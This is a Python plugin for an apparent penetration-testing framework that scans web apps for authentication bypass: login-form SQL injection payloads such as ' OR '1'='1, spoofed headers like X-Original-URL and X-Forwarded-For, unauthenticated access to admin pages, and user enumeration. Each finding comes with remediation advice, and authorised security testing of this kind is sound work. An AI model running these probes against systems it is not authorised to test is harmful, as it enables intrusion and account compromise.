"""Authentication bypass testing.

Tests for password reset flaws, 2FA bypass, direct page access without
authentication, authentication header manipulation, and login form
SQL injection. Complements default_creds (known credentials) and
service_brute (brute force).
"""

from __future__ import annotations

import logging
import re
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Common auth/login endpoints
AUTH_ENDPOINTS = [
    "/login", "/login.jsp", "/login.php", "/login.aspx", "/login.html",
    "/signin", "/auth", "/auth/login",
    "/doLogin", "/j_security_check", "/j_spring_security_check",
    "/api/login", "/api/auth", "/api/v1/login",
    "/admin/login", "/user/login", "/account/login",
]

# Password reset endpoints
RESET_ENDPOINTS = [
    "/forgot", "/forgot-password", "/password/reset",
    "/reset-password", "/recover", "/api/password/reset",
    "/api/forgot-password", "/auth/forgot",
]

# Protected pages to test direct access
PROTECTED_PAGES = [
    "/admin", "/dashboard", "/panel", "/settings",
    "/profile", "/account", "/api/users", "/api/admin",
    "/internal", "/manage", "/console",
]

# SQL injection payloads for login forms
LOGIN_SQLI = [
    "' OR '1'='1", "' OR '1'='1'--", "admin'--",
    "' OR 1=1--", "\" OR 1=1--", "' OR ''='",
]


class AuthBypassPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="auth_bypass",
        display_name="Authentication Bypass",
        category=PluginCategory.PENTESTING,
        description=(
            "Test for authentication bypass, weak password recovery, "
            "direct access without auth, and login form injection"
        ),
        produces=["auth_bypass"],
        depends_on=[],
        requires_http=True,
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        tested: list[dict] = []

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"auth_bypass_tests": []},
            )

        # Phase 1: Detect login and reset endpoints
        login_urls = await self._find_endpoints(ctx, base_url, AUTH_ENDPOINTS)

        # Phase 2: Login form SQLi (highest-value test — run first)
        if not ctx.should_stop and login_urls:
            await self._test_login_sqli(ctx, login_urls, findings, tested)

        # Phase 3: User enumeration via login
        if not ctx.should_stop and login_urls:
            await self._test_user_enum(ctx, login_urls, findings, tested)

        # Phase 4: Direct access to protected pages without auth
        if not ctx.should_stop:
            await self._test_direct_access(ctx, base_url, findings, tested)

        # Phase 5: Auth header manipulation
        if not ctx.should_stop and login_urls:
            await self._test_header_bypass(ctx, base_url, findings, tested)

        # Phase 6: Password reset flaws
        reset_urls = await self._find_endpoints(ctx, base_url, RESET_ENDPOINTS)
        if not ctx.should_stop and reset_urls:
            await self._test_reset_flaws(ctx, reset_urls, findings, tested)

        if not findings:
            findings.append(Finding.info(
                "No authentication bypass vulnerabilities detected",
                tags=["pentesting", "auth_bypass"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "auth_bypass_tests": tested,
                "login_endpoints": login_urls,
                "reset_endpoints": reset_urls,
            },
        )

    # ── Test phases ──────────────────────────────────────────────────

    async def _find_endpoints(
        self, ctx, base_url: str, paths: list[str],
    ) -> list[str]:
        """Probe paths and return those that exist (non-404)."""
        found: list[str] = []
        for path in paths:
            if ctx.should_stop:
                break
            url = f"{base_url}{path}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=5.0, allow_redirects=False)
                    if resp.status not in (404, 405, 502, 503):
                        found.append(url)
            except Exception:
                continue
        return found

    async def _test_direct_access(
        self, ctx, base_url: str, findings: list, tested: list,
    ) -> None:
        """Test direct access to protected pages without authentication."""
        for path in PROTECTED_PAGES:
            if ctx.should_stop or len(findings) >= 6:
                return
            url = f"{base_url}{path}"
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    body = await resp.text(encoding="utf-8", errors="replace")

                tested.append({"path": path, "type": "direct_access", "status": resp.status})

                if resp.status == 200 and self._has_admin_content(body):
                    findings.append(Finding.high(
                        f"Unauthenticated access to {path}",
                        description=(
                            f"Protected page {path} is accessible without "
                            f"authentication, exposing administrative content"
                        ),
                        evidence=f"GET {url} → 200 OK",
                        confidence=0.7,
                        remediation="Enforce authentication for all protected endpoints",
                        tags=["pentesting", "auth_bypass", "access_control"],
                    ))
            except Exception:
                continue

    async def _test_header_bypass(
        self, ctx, base_url: str, findings: list, tested: list,
    ) -> None:
        """Test authentication bypass via header manipulation."""
        protected = f"{base_url}/admin"

        # Test removing auth and using bypass headers
        bypass_headers = [
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Custom-IP-Authorization", "127.0.0.1"),
        ]

        # Get baseline (should be 401/403/302)
        try:
            async with ctx.rate:
                baseline = await ctx.http.get(protected, timeout=5.0)
                baseline_status = baseline.status
        except Exception:
            return

        if baseline_status == 200:
            return  # Already accessible, handled in direct access test

        for hdr_name, hdr_value in bypass_headers:
            if ctx.should_stop:
                return
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        base_url, headers={hdr_name: hdr_value}, timeout=5.0,
                    )

                tested.append({
                    "type": "header_bypass", "header": hdr_name,
                    "status": resp.status,
                })

                if resp.status == 200 and baseline_status in (401, 403):
                    body = await resp.text(encoding="utf-8", errors="replace")
                    if self._has_admin_content(body):
                        findings.append(Finding.critical(
                            f"Auth bypass via {hdr_name} header",
                            description=(
                                f"Setting {hdr_name}: {hdr_value} bypasses "
                                f"authentication (baseline: {baseline_status})"
                            ),
                            evidence=f"Header: {hdr_name}: {hdr_value}\nStatus: 200",
                            confidence=0.8,
                            remediation=(
                                "Do not trust client-provided headers for "
                                "authentication or authorization decisions"
                            ),
                            tags=["pentesting", "auth_bypass", "header"],
                        ))
                        return
            except Exception:
                continue

    async def _test_reset_flaws(
        self, ctx, reset_urls: list[str], findings: list, tested: list,
    ) -> None:
        """Test password reset for user enumeration and token predictability."""
        for url in reset_urls[:3]:
            if ctx.should_stop:
                return

            # Test with known username vs unknown
            try:
                async with ctx.rate:
                    resp_known = await ctx.http.post(
                        url,
                        data={"email": "admin@test.com", "username": "admin"},
                        timeout=8.0,
                    )
                    body_known = await resp_known.text(encoding="utf-8", errors="replace")

                async with ctx.rate:
                    resp_unknown = await ctx.http.post(
                        url,
                        data={
                            "email": "nonexistent_xyz123@test.com",
                            "username": "nonexistent_xyz123",
                        },
                        timeout=8.0,
                    )
                    body_unknown = await resp_unknown.text(encoding="utf-8", errors="replace")

                tested.append({"url": url, "type": "reset_enum"})

                # Different responses = user enumeration
                if (resp_known.status != resp_unknown.status
                        or self._responses_differ_meaningfully(body_known, body_unknown)):
                    findings.append(Finding.medium(
                        f"User enumeration via password reset at {url}",
                        description=(
                            "Password reset responds differently for valid vs "
                            "invalid users, enabling user enumeration"
                        ),
                        evidence=(
                            f"Valid user: {resp_known.status}\n"
                            f"Invalid user: {resp_unknown.status}"
                        ),
                        confidence=0.6,
                        remediation=(
                            "Return identical responses for valid and invalid "
                            "users on password reset"
                        ),
                        tags=["pentesting", "auth_bypass", "enumeration"],
                    ))
            except Exception:
                continue

    async def _test_login_sqli(
        self, ctx, login_urls: list[str], findings: list, tested: list,
    ) -> None:
        """Quick SQL injection test on login forms."""
        for url in login_urls[:2]:
            if ctx.should_stop or len(findings) >= 6:
                return

            # Get the login page to find form fields
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=5.0)
                    html = await resp.text(encoding="utf-8", errors="replace")
            except Exception:
                continue

            # Find form fields
            user_field = self._find_field(
                html, ["username", "uname", "user", "email", "login", "uid"],
            )
            pass_field = self._find_field(
                html, ["password", "passwd", "passw", "pass", "pwd"],
            )

            if not user_field or not pass_field:
                continue

            # Extract form action from the login form (form with password field)
            post_url = url
            action_m = None
            for form_m in re.finditer(
                r'<form\s+([^>]*)>(.*?)</form>', html,
                re.IGNORECASE | re.DOTALL,
            ):
                form_body = form_m.group(2)
                if re.search(r'type\s*=\s*["\']?password', form_body, re.IGNORECASE):
                    action_m = re.search(
                        r'action\s*=\s*["\']?([^"\'>\s]+)',
                        form_m.group(1), re.IGNORECASE,
                    )
                    break
            if action_m:
                action = action_m.group(1)
                if action.startswith(("http://", "https://")):
                    post_url = action
                elif action.startswith("/"):
                    from urllib.parse import urlparse
                    parsed = urlparse(url)
                    post_url = f"{parsed.scheme}://{parsed.netloc}{action}"
                elif action:
                    post_url = url.rsplit("/", 1)[0] + "/" + action

            # Get baseline with normal credentials
            try:
                async with ctx.rate:
                    baseline = await ctx.http.post(
                        post_url,
                        data={user_field: "testuser", pass_field: "testpass"},
                        timeout=8.0,
                        allow_redirects=False,
                    )
                    baseline_status = baseline.status
                    baseline_location = (baseline.headers.get("Location", "") or "")
                    baseline_body_len = len(await baseline.text(
                        encoding="utf-8", errors="replace",
                    ))
            except Exception:
                continue

            for payload in LOGIN_SQLI[:3]:
                if ctx.should_stop:
                    return
                try:
                    async with ctx.rate:
                        resp = await ctx.http.post(
                            post_url,
                            data={user_field: payload, pass_field: "anything"},
                            timeout=8.0,
                            allow_redirects=False,
                        )

                    resp_location = (resp.headers.get("Location", "") or "")
                    resp_body_len = len(await resp.text(
                        encoding="utf-8", errors="replace",
                    ))

                    tested.append({
                        "url": url, "type": "login_sqli",
                        "payload": payload[:30], "status": resp.status,
                    })

                    # Detect bypass: different redirect target OR redirect
                    # vs non-redirect OR significantly different body size
                    is_bypass = False
                    if (resp.status in (301, 302, 303)
                            and baseline_status not in (301, 302, 303)):
                        is_bypass = True
                    elif (resp.status in (301, 302, 303)
                            and baseline_status in (301, 302, 303)
                            and resp_location != baseline_location
                            and "login" not in resp_location.lower()):
                        is_bypass = True
                    elif (resp.status == 200 and baseline_status == 200
                            and abs(resp_body_len - baseline_body_len) > 200):
                        is_bypass = True

                    if is_bypass:
                        findings.append(Finding.critical(
                            f"SQL injection auth bypass on {url}",
                            description=(
                                "Login form accepts SQL injection payload, "
                                "resulting in different response (auth bypass)"
                            ),
                            evidence=(
                                f"URL: {url}\n"
                                f"Payload: {user_field}={payload}\n"
                                f"Status: {resp.status} → {resp_location}\n"
                                f"Baseline: {baseline_status} → {baseline_location}"
                            ),
                            confidence=0.80,
                            remediation=(
                                "Use parameterized queries for authentication; "
                                "never concatenate user input into SQL"
                            ),
                            tags=["pentesting", "auth_bypass", "sqli"],
                        ))
                        return
                except Exception:
                    continue

    async def _test_user_enum(
        self, ctx, login_urls: list[str], findings: list, tested: list,
    ) -> None:
        """Test login for user enumeration via error messages."""
        for url in login_urls[:2]:
            if ctx.should_stop:
                return

            try:
                async with ctx.rate:
                    resp1 = await ctx.http.post(
                        url,
                        data={"username": "admin", "password": "wrong_password_xyz"},
                        timeout=8.0,
                    )
                    body1 = await resp1.text(encoding="utf-8", errors="replace")

                async with ctx.rate:
                    resp2 = await ctx.http.post(
                        url,
                        data={"username": "nonexistent_xyz987", "password": "wrong"},
                        timeout=8.0,
                    )
                    body2 = await resp2.text(encoding="utf-8", errors="replace")

                tested.append({"url": url, "type": "user_enum"})

                if self._responses_differ_meaningfully(body1, body2):
                    findings.append(Finding.low(
                        f"User enumeration via login at {url}",
                        description=(
                            "Login responds differently for valid vs invalid "
                            "usernames, enabling user enumeration"
                        ),
                        evidence=f"URL: {url}",
                        remediation="Use generic error messages for login failures",
                        tags=["pentesting", "auth_bypass", "enumeration"],
                    ))
            except Exception:
                continue

    # ── Helpers ──────────────────────────────────────────────────────

    @staticmethod
    def _has_admin_content(body: str) -> bool:
        """Check if page contains administrative content indicators."""
        indicators = [
            "dashboard", "admin panel", "control panel", "management",
            "user management", "settings", "configuration",
            '<form', '<table', 'class="admin',
        ]
        body_lower = body.lower()
        matches = sum(1 for ind in indicators if ind in body_lower)
        return matches >= 2

    @staticmethod
    def _find_field(html: str, candidates: list[str]) -> str | None:
        """Find a form field name matching one of the candidates."""
        for name in candidates:
            if re.search(
                rf'name\s*=\s*["\']?{re.escape(name)}(?=["\'\s/>])',
                html, re.IGNORECASE,
            ):
                return name
        return None

    @staticmethod
    def _responses_differ_meaningfully(body1: str, body2: str) -> bool:
        """Check if two responses differ in a meaningful way."""
        if body1 == body2:
            return False
        # Check for different error messages
        error_patterns = [
            r"user\s*not\s*found", r"invalid\s*user", r"no\s*account",
            r"incorrect\s*password", r"wrong\s*password",
            r"does\s*not\s*exist", r"unknown\s*user",
        ]
        for pattern in error_patterns:
            in_1 = bool(re.search(pattern, body1, re.IGNORECASE))
            in_2 = bool(re.search(pattern, body2, re.IGNORECASE))
            if in_1 != in_2:
                return True
        # Significant length difference
        return abs(len(body1) - len(body2)) > 50
